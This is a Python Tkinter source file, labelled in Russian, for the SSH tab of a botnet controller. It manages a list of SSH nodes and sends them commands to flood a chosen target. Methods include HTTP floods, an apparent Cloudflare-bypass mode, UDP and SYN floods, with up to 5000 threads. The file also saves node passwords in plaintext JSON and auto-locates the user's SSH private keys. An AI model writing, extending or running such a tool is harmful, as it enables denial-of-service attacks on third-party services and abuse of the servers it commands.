import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading, os, json
from botnet.ssh_manager import SSHManager
from gui.widgets import RightClickMenu

NODES_FILE = "ssh_nodes.json"

class SshTab:
    def __init__(self, notebook, app):
        self.app = app
        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text="🔌 SSH Серверы")
        self.ssh_manager = SSHManager()
        self.node_rows = {}
        self.selected_nodes = set()
        self._build_ui()
        self._load_nodes()
        self._update_table()

    def _build_ui(self):
        self.frame.columnconfigure(0, weight=1)
        self.frame.rowconfigure(0, weight=1)
        self.frame.rowconfigure(1, weight=0)
        cols = ('host', 'port', 'user', 'status')
        self.ssh_tree = ttk.Treeview(self.frame, columns=cols, show='headings', selectmode='extended', height=10)
        self.ssh_tree.heading('host', text='Хост'); self.ssh_tree.column('host', width=140)
        self.ssh_tree.heading('port', text='Порт'); self.ssh_tree.column('port', width=60)
        self.ssh_tree.heading('user', text='Логин'); self.ssh_tree.column('user', width=100)
        self.ssh_tree.heading('status', text='Статус'); self.ssh_tree.column('status', width=80)
        self.ssh_tree.grid(row=0, column=0, sticky='nsew')
        scrollbar = ttk.Scrollbar(self.frame, orient='vertical', command=self.ssh_tree.yview)
        scrollbar.grid(row=0, column=1, sticky='ns')
        self.ssh_tree.configure(yscrollcommand=scrollbar.set)

        add_frame = ttk.Frame(self.frame)
        add_frame.grid(row=1, column=0, columnspan=2, sticky='ew', pady=5)
        ttk.Label(add_frame, text="Хост:").grid(row=0, column=0, sticky='w')
        self.e_host = ttk.Entry(add_frame, width=20); self.e_host.grid(row=0, column=1, padx=5)
        ttk.Label(add_frame, text="Порт:").grid(row=0, column=2)
        self.e_port = ttk.Entry(add_frame, width=6); self.e_port.insert(0, "6000"); self.e_port.grid(row=0, column=3, padx=5)
        ttk.Label(add_frame, text="Логин:").grid(row=1, column=0, sticky='w')
        self.e_user = ttk.Entry(add_frame, width=20); self.e_user.grid(row=1, column=1, padx=5)
        ttk.Label(add_frame, text="Пароль:").grid(row=1, column=2)
        self.e_pass = ttk.Entry(add_frame, width=20, show='*'); self.e_pass.grid(row=1, column=3, padx=5)
        ttk.Label(add_frame, text="Ключ:").grid(row=2, column=0, sticky='w')
        key_frame = ttk.Frame(add_frame)
        key_frame.grid(row=2, column=1, columnspan=3, padx=5, sticky='we')
        self.e_key = ttk.Entry(key_frame, width=30); self.e_key.pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(key_frame, text="📂", width=3, command=self._browse_key).pack(side=tk.LEFT)
        ttk.Button(key_frame, text="🔑 Авто", command=self._auto_find_key).pack(side=tk.LEFT, padx=2)

        btn_frame = ttk.Frame(add_frame)
        btn_frame.grid(row=3, column=0, columnspan=4, pady=5, sticky='we')
        ttk.Button(btn_frame, text="➕ Добавить", command=self._add_node).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🗑 Удалить", command=self._remove_node).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🔗 Подключить", command=self._connect_selected).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🔌 Отключить", command=self._disconnect_selected).pack(side=tk.LEFT, padx=2)

        task_frame = ttk.LabelFrame(self.frame, text="Задача для выбранных SSH-узлов", padding=5)
        task_frame.grid(row=2, column=0, columnspan=2, sticky='ew', pady=5)
        ttk.Label(task_frame, text="Цель:").grid(row=0, column=0, sticky='w')
        self.ssh_target = ttk.Entry(task_frame, width=25); self.ssh_target.grid(row=0, column=1, padx=5)
        ttk.Label(task_frame, text="Метод:").grid(row=0, column=2)
        # Обновлённый список методов
        self.ssh_method = ttk.Combobox(task_frame, values=["GET","POST","CFB","CFBUAM","RAPID","TCP","UDP","SYN_FLOOD"], state='readonly', width=12)
        self.ssh_method.set("CFBUAM"); self.ssh_method.grid(row=0, column=3, padx=5)
        ttk.Label(task_frame, text="Потоки:").grid(row=0, column=4)
        self.ssh_threads = ttk.Spinbox(task_frame, from_=10, to=5000, increment=10, width=6)
        self.ssh_threads.set(100); self.ssh_threads.grid(row=0, column=5, padx=5)
        ttk.Button(task_frame, text="⚡ Запустить атаку", command=self._attack_selected).grid(row=0, column=6, padx=5)
        ttk.Button(task_frame, text="⏹ Остановить", command=self._stop_selected).grid(row=0, column=7, padx=5)

    def _add_node(self):
        host = self.e_host.get().strip()
        port = int(self.e_port.get().strip() or '6000')
        user = self.e_user.get().strip()
        passw = self.e_pass.get().strip()
        key = self.e_key.get().strip()
        if not host or not user:
            messagebox.showerror("Ошибка", "Введите хост и логин")
            return
        node = self.ssh_manager.add_node(host, port, user, passw or None, key or None)
        iid = self.ssh_tree.insert('', tk.END, values=(host, port, user, '✗ Офлайн'))
        self.node_rows[f"{host}:{port}"] = iid
        self._save_nodes()

    def _remove_node(self):
        for iid in self.ssh_tree.selection():
            values = self.ssh_tree.item(iid, 'values')
            if not values: continue
            host, port = values[0], int(values[1])
            key = f"{host}:{port}"
            if key in self.node_rows: del self.node_rows[key]
            self.ssh_tree.delete(iid)
            for i, node in enumerate(self.ssh_manager.nodes):
                if node.host == host and node.port == port:
                    self.ssh_manager.remove_node(i)
                    break
        self._save_nodes()

    def _connect_selected(self):
        for iid in self.ssh_tree.selection():
            values = self.ssh_tree.item(iid, 'values')
            if not values: continue
            host, port = values[0], int(values[1])
            node = self.ssh_manager.find_node(host, port)
            if node and not node.connected:
                threading.Thread(target=self._do_connect, args=(node,), daemon=True).start()

    def _do_connect(self, node):
        res = node.connect()
        if res is True:
            self.app.logger.info(f"SSH подключён: {node.host}")
        else:
            self.app.logger.error(f"SSH ошибка: {res}")

    def _disconnect_selected(self):
        for iid in self.ssh_tree.selection():
            values = self.ssh_tree.item(iid, 'values')
            if not values: continue
            host, port = values[0], int(values[1])
            node = self.ssh_manager.find_node(host, port)
            if node and node.connected:
                node.disconnect()

    def _attack_selected(self):
        target = self.ssh_target.get().strip()
        method = self.ssh_method.get()
        threads = int(self.ssh_threads.get())
        if not target:
            messagebox.showerror("Ошибка", "Введите цель")
            return
        for iid in self.ssh_tree.selection():
            values = self.ssh_tree.item(iid, 'values')
            if not values: continue
            host, port = values[0], int(values[1])
            node = self.ssh_manager.find_node(host, port)
            if node and node.connected:
                threading.Thread(target=node.start_attack, args=(target, method, threads), daemon=True).start()

    def _stop_selected(self):
        for iid in self.ssh_tree.selection():
            values = self.ssh_tree.item(iid, 'values')
            if not values: continue
            host, port = values[0], int(values[1])
            node = self.ssh_manager.find_node(host, port)
            if node:
                node.stop_attack()

    def _browse_key(self):
        filename = filedialog.askopenfilename(title="Выберите SSH-ключ")
        if filename:
            self.e_key.delete(0, tk.END); self.e_key.insert(0, filename)

    def _auto_find_key(self):
        home = os.path.expanduser("~")
        candidates = [
            os.path.join(home, ".ssh", "google_compute_engine"),
            os.path.join(home, ".ssh", "id_rsa"),
        ]
        for p in candidates:
            if os.path.isfile(p):
                self.e_key.delete(0, tk.END); self.e_key.insert(0, p)
                return
        messagebox.showinfo("Не найдено", "SSH-ключ не найден. Укажите путь вручную.")

    def _save_nodes(self):
        data = []
        for node in self.ssh_manager.nodes:
            data.append({
                'host': node.host,
                'port': node.port,
                'username': node.username,
                'password': node.password or '',
                'key_file': node.key_file or '',
            })
        with open(NODES_FILE, 'w') as f:
            json.dump(data, f, indent=2)

    def _load_nodes(self):
        if os.path.exists(NODES_FILE):
            try:
                with open(NODES_FILE) as f:
                    data = json.load(f)
                for item in data:
                    pw = item.get('password') or None
                    kf = item.get('key_file') or None
                    node = self.ssh_manager.add_node(item['host'], item['port'], item['username'], pw, kf)
                    iid = self.ssh_tree.insert('', tk.END, values=(item['host'], item['port'], item['username'], '✗ Офлайн'))
                    self.node_rows[f"{item['host']}:{item['port']}"] = iid
            except Exception as e:
                self.app.logger.error(f"SSH загрузка: {e}")

    def _update_table(self):
        for key, iid in list(self.node_rows.items()):
            if iid not in self.ssh_tree.get_children():
                del self.node_rows[key]
                continue
            host, port = key.split(':'); port = int(port)
            node = self.ssh_manager.find_node(host, port)
            if node:
                status = '✓ Онлайн' if node.connected else '✗ Офлайн'
                self.ssh_tree.item(iid, values=(host, port, node.username, status))
            else:
                del self.node_rows[key]
                self.ssh_tree.delete(iid)
        self.frame.after(2000, self._update_table)